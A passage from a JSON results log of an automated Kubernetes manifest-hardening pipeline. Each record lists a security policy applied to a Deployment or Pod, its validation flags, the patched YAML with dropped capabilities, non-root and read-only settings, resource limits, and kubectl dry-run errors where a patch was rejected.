    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: loadgenerator\nspec:\n  selector:\n    matchLabels:\n      app: loadgenerator\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: loadgenerator\n      annotations:\n        sidecar.istio.io/rewriteAppHTTPProbers: 'true'\n    spec:\n      serviceAccountName: default\n      initContainers:\n      - command:\n        - /bin/sh\n        - -exc\n        - \"echo \\\"Init container pinging frontend: ${FRONTEND_ADDR}...\\\"\\nSTATUSCODE=$(wget\\\n          \\ --server-response http://${FRONTEND_ADDR} 2>&1 | awk '/^  HTTP/{print\\\n          \\ $2}')\\nif test $STATUSCODE -ne 200; then\\n    echo \\\"Error: Could not\\\n          \\ reach frontend - Status code: ${STATUSCODE}\\\"\\n    exit 1\\nfi\\n\"\n        name: frontend-check\n        image: busybox:stable\n        securityContext:\n          runAsUser: 65534\n          runAsGroup: 65534\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - name: main\n        image: loadgenerator:stable\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n        - name: USERS\n          value: '10'\n        resources:\n          requests:\n            cpu: 300m\n            memory: 256Mi\n          limits:\n            cpu: 500m\n            memory: 512Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01293",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: loadgenerator\nspec:\n  selector:\n    matchLabels:\n      app: loadgenerator\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: loadgenerator\n      annotations:\n        sidecar.istio.io/rewriteAppHTTPProbers: 'true'\n    spec:\n      serviceAccountName: default\n      initContainers:\n      - command:\n        - /bin/sh\n        - -exc\n        - \"echo \\\"Init container pinging frontend: ${FRONTEND_ADDR}...\\\"\\nSTATUSCODE=$(wget\\\n          \\ --server-response http://${FRONTEND_ADDR} 2>&1 | awk '/^  HTTP/{print\\\n          \\ $2}')\\nif test $STATUSCODE -ne 200; then\\n    echo \\\"Error: Could not\\\n          \\ reach frontend - Status code: ${STATUSCODE}\\\"\\n    exit 1\\nfi\\n\"\n        name: frontend-check\n        image: busybox:stable\n        securityContext:\n          runAsUser: 65534\n          runAsGroup: 65534\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      containers:\n      - name: main\n        image: loadgenerator:stable\n        env:\n        - name: FRONTEND_ADDR\n          value: frontend:80\n        - name: USERS\n          value: '10'\n        resources:\n          requests:\n            cpu: 300m\n            memory: 256Mi\n          limits:\n            cpu: 500m\n            memory: 512Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01294",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-foghorn\n  labels:\n    chart: lighthouse-1.3.1\n    app: lighthouse-foghorn\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-foghorn\n  template:\n    metadata:\n      labels:\n        app: lighthouse-foghorn\n      annotations:\n        jenkins-x.io/hash: 4680350d90b15cd48f3a8504bff0c968752ad64ad3080e746113158aa5eb44b3\n    spec:\n      serviceAccountName: lighthouse-foghorn\n      containers:\n      - name: lighthouse-foghorn\n        image: ghcr.io/jenkins-x/lighthouse-foghorn:1.3.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: pa.gigante\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: HMAC_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-hmac-token\n              key: hmac\n              optional: false\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.3.1\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        - name: LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: 60d2f020b3003672ecbc8c9abd2f3cf20344fee2\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n",
    "errors": []
  },
  {
    "id": "01295",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-foghorn\n  labels:\n    chart: lighthouse-1.3.1\n    app: lighthouse-foghorn\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-foghorn\n  template:\n    metadata:\n      labels:\n        app: lighthouse-foghorn\n      annotations:\n        jenkins-x.io/hash: 4680350d90b15cd48f3a8504bff0c968752ad64ad3080e746113158aa5eb44b3\n    spec:\n      serviceAccountName: lighthouse-foghorn\n      containers:\n      - name: lighthouse-foghorn\n        image: ghcr.io/jenkins-x/lighthouse-foghorn:1.3.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: pa.gigante\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: HMAC_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-hmac-token\n              key: hmac\n              optional: false\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.3.1\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        - name: LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: 60d2f020b3003672ecbc8c9abd2f3cf20344fee2\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01296",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: newacrname.azurecr.io/captureorder:placeholdertag\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: team-azch\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n",
    "errors": []
  },
  {
    "id": "01297",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: captureorder\nspec:\n  selector:\n    matchLabels:\n      app: captureorder\n  replicas: 2\n  template:\n    metadata:\n      labels:\n        app: captureorder\n    spec:\n      containers:\n      - name: captureorder\n        image: newacrname.azurecr.io/captureorder:placeholdertag\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        livenessProbe:\n          httpGet:\n            port: 8080\n            path: /healthz\n        resources:\n          requests:\n            memory: 64Mi\n            cpu: 100m\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        env:\n        - name: TEAMNAME\n          value: team-azch\n        - name: MONGOHOST\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoHost\n        - name: MONGOUSER\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoUser\n        - name: MONGOPASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mongodb\n              key: mongoPassword\n        ports:\n        - containerPort: 80\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01298",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7722\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01299",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7722\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01300",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7722\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01301",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7722\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01302",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-7722\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01303",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"hello\" namespace: \"\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01304",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"hello\" namespace: \"\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01305",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"hello\" namespace: \"\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01306",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"hello\" namespace: \"\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01307",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: fio\nspec:\n  volumes:\n  - name: ms-volume\n    persistentVolumeClaim:\n      claimName: ms-volume-claim\n  containers:\n  - name: fio\n    image: nixery.dev/shell/fio/tini:stable\n    command:\n    - tini\n    - --\n    args:\n    - sleep\n    - '1000000'\n    volumeMounts:\n    - mountPath: /volume\n      name: ms-volume\n    securityContext:\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01308",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: fio\nspec:\n  volumes:\n  - name: ms-volume\n    persistentVolumeClaim:\n      claimName: ms-volume-claim\n  containers:\n  - name: fio\n    image: nixery.dev/shell/fio/tini:stable\n    command:\n    - tini\n    - --\n    args:\n    - sleep\n    - '1000000'\n    volumeMounts:\n    - mountPath: /volume\n      name: ms-volume\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01309",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: fio\nspec:\n  volumes:\n  - name: ms-volume\n    persistentVolumeClaim:\n      claimName: ms-volume-claim\n  containers:\n  - name: fio\n    image: nixery.dev/shell/fio/tini:stable\n    command:\n    - tini\n    - --\n    args:\n    - sleep\n    - '1000000'\n    volumeMounts:\n    - mountPath: /volume\n      name: ms-volume\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01310",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: fio\nspec:\n  volumes:\n  - name: ms-volume\n    persistentVolumeClaim:\n      claimName: ms-volume-claim\n  containers:\n  - name: fio\n    image: nixery.dev/shell/fio/tini:stable\n    command:\n    - tini\n    - --\n    args:\n    - sleep\n    - '1000000'\n    volumeMounts:\n    - mountPath: /volume\n      name: ms-volume\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01311",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: fio\nspec:\n  volumes:\n  - name: ms-volume\n    persistentVolumeClaim:\n      claimName: ms-volume-claim\n  containers:\n  - name: fio\n    image: nixery.dev/shell/fio/tini:stable\n    command:\n    - tini\n    - --\n    args:\n    - sleep\n    - '1000000'\n    volumeMounts:\n    - mountPath: /volume\n      name: ms-volume\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01312",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cos\n  labels:\n    app.kubernetes.io/component: cos\n    app.kubernetes.io/instance: cos\n    app.kubernetes.io/name: cos\n    app.kubernetes.io/part-of: cos\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: cos\n      app.kubernetes.io/instance: cos\n      app.kubernetes.io/name: cos\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: cos\n        app.kubernetes.io/instance: cos\n        app.kubernetes.io/name: cos\n    spec:\n      containers:\n      - image: nginx:1.20-alpine\n        name: cos\n        ports:\n        - containerPort: 80\n          protocol: TCP\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 100m\n            memory: 256Mi\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 80\n          failureThreshold: 30\n          periodSeconds: 5\n          initialDelaySeconds: 10\n        livenessProbe:\n          httpGet:\n            path: /index.html\n            port: 80\n          failureThreshold: 30\n          periodSeconds: 5\n          initialDelaySeconds: 10\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n",
    "errors": []
  },
  {
    "id": "01313",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cos\n  labels:\n    app.kubernetes.io/component: cos\n    app.kubernetes.io/instance: cos\n    app.kubernetes.io/name: cos\n    app.kubernetes.io/part-of: cos\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: cos\n      app.kubernetes.io/instance: cos\n      app.kubernetes.io/name: cos\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: cos\n        app.kubernetes.io/instance: cos\n        app.kubernetes.io/name: cos\n    spec:\n      containers:\n      - image: nginx:1.20-alpine\n        name: cos\n        ports:\n        - containerPort: 80\n          protocol: TCP\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 100m\n            memory: 256Mi\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 80\n          failureThreshold: 30\n          periodSeconds: 5\n          initialDelaySeconds: 10\n        livenessProbe:\n          httpGet:\n            path: /index.html\n            port: 80\n          failureThreshold: 30\n          periodSeconds: 5\n          initialDelaySeconds: 10\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01314",
    "policy_id": "no_latest_tag",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"test-job\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "01315",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"test-job\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "01316",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"test-job\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "01317",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"test-job\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "01318",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"test-job\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "01319",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: sinker\n  labels:\n    app: sinker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sinker\n  template:\n    metadata:\n      labels:\n        app: sinker\n    spec:\n      serviceAccountName: sinker\n      containers:\n      - name: sinker\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        image: gcr.io/k8s-prow/sinker:v20210427-e4ab4d8c8f\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "errors": []
  },
  {
    "id": "01320",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
